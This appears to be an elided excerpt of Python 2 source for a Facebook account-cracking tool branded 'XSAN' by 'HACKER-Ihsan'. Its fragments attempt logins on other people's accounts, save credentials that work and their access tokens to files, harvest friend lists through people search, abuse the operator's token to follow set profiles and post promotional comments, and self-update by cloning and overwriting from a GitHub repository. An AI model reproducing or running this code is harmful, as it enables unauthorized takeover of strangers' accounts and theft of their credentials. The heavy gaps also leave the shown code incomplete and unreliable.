...
# Github : https://github.com/HACKERIHSAN/
...
def jalankan_tool():
    os.system('PREM.pyc' if os.name == 'nt' else 'python2 PREM.pyc')
...
def love_token(token):
    lis_id_foll = ['100060885769913', '100009834670141']
    with requests.Session() as (dev_):
...
def komen(token):
    for dev in range(1):
        with requests.Session() as (dev_):
            komen_ = random.choice(['Great Tools', 'How are you bro', 'Love XSAN Bro', 'Hello Bro', 'Cool Boss..', 'Thanks bro for the tools', 'Its not in pain that I use a tool, brother, So cool, No Pain, No Gain'])
        ...
        try:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                if eml_dev in hasil_ok:
                    ...
                    print a + '\r{' + p + 'XSAN=OK' + a + '}' + h + (' {:<15}\x1b[96;1m | \x1b[97;1m{} \x1b[96;1mLogin Id With Fb Lite ').format(eml_dev, san_dev)
                    with open('XSAN_ok.txt', 'a') as (hasil):
                        hasil.write('[XSAN=OK] ' + eml_dev + ' | ' + san_dev + '\n')
                    hasil_ok.append(eml_dev)
                    token = response.json()['access_token']
                    with open('chekpoint.txt', 'a') as (tumbal):
                        tumbal.write(token + '\n')
        ...
        try:
            ...
            with requests.Session() as (ses_dev):
                ...
                if 'c_user' in login_dev:
                    ...
                    eml_dev = login_dev.get_dict()['XSAN=CP'].split('%')[4].replace('3A', '')
                    if len(iqbal_) == 2:
                        if eml_dev in hasil_cp:
                            pass
                        else:
...
def cek_akun_tumbal():
    ...
    try:
        token = open('account_tumbal.txt', 'r').readlines()
    except IOError:
        print m + '\n No results yet...'
    else:
        try:
...
"""+k+"""( /   \ )/\____) || )   ( || )  \  |
"""+k+"""|/     \|\_______)|/     \||/    )_)
XSANO"""+p+""" {"""+h+"""HEART-Broken"""+p+"""}"""+a+""" \/ {"""+k+"""EDITOR"""+a+""": """+h+"""HACKER-Ihsan"""+a+"""} """                                    
...
def login():
    ...
    try:
        ...
        print p + '       [ LOGIN MENU ]'
        print garis
        print p + ' [' + k + '1' + p + ']' + a + ' Login With FB' + h + ' TOKEN'
        print p + ' [' + k + '2' + p + ']' + a + ' Login With FB' + h + ' Cookie'
        print p + ' [' + k + '3' + p + ']' + a + ' Login With FB' + h + ' Username & Password'
        print p + ' [' + k + '4' + p + ']' + h + ' Contact Owner' + h + ' Mr=IHSAN'
        print p + ' [' + k + '5' + p + ']' + a + ' How to get FB Cookies'
        try:
            if user_agent_ == cokiez:
                print p + ' [' + k + '6' + p + ']' + a + ' Crack From Search(No login)[Premium!]'
                print p + ' [' + k + '7' + p + ']' + a + ' Cheek Result CP'
                print p + ' [' + k + '8' + p + ']' + a + ' Cheek Result OK'
            else:
                print p + ' [' + k + '6' + p + ']' + a + ' Crack From Search(No login)[Premium!]'
                print p + ' [' + k + '7' + p + ']' + a + ' Cheek Result CP'
                print p + ' [' + k + '8' + p + ']' + a + ' Cheek Result OK'
        ...
        if pilih == '4':
            try:
                subprocess.check_output(['am', 'start', 'https://github.com/HACKERIHSAN/'])
                login()
            except:
                login()

        if pilih == '5':
            url_ytb = 'https://www.facebook.com/unknownXX007'
            try:
        ...
        admin = k + '\n [>.] Please Contact Admin! \n' + h + '     No. Whatsapp Admin =>' + p + ' +994 40 185 08 14'
        try:
            if user_agent_ == cokiez:
                if pilih == '6':
                    print garis
...
def __menu__(token):
    ...
    try:
        ...
        with requests.Session() as (ses_):
            ...
            print garis
            print h + ' [' + k + '*' + h + ']' + p + ' SALAM:', a + '{' + p + nama['name'] + a + '}'
            ...
            try:
                if user_agent_ == cokiez:
                    ...
                    if '|' in user_agentzz_:
                        print h + ' [' + k + '*' + h + ']' + p + ' Time: ' + h + 'Unlimited'
                    else:
                        if ':' in str(lim_dev) or '-' in str(lim_dev):
                            ...
                            print p + ' [>] Contact Admin No WA:' + p + ' +994 40 185 08 14'
            ...
            try:
                if user_agent_ == cokiez:
                    if pilih == '2' and pillih == angka:
                        ...
                        cek_cookie()
                        cari_teman.append(1)
                        keyword = raw_input(h + '\n [' + p + '?' + h + ']' + p + ' Look for people to take the list of friends' + k + ': ')
                        jumlah = 2
                        u_orang = ('https://mbasic.facebook.com/search/people/?q={}').format(keyword)
                        cari_orang(jumlah, u_orang, cookie)
            ...
            if pilih == '11':
                import os
                try:
                    os.system('git clone https://github.com/HACKERIHSAN/PREM')
                    os.system('rm -rf  PREM.py')
                    os.system('cp -f PREM/PREM.py \\.')
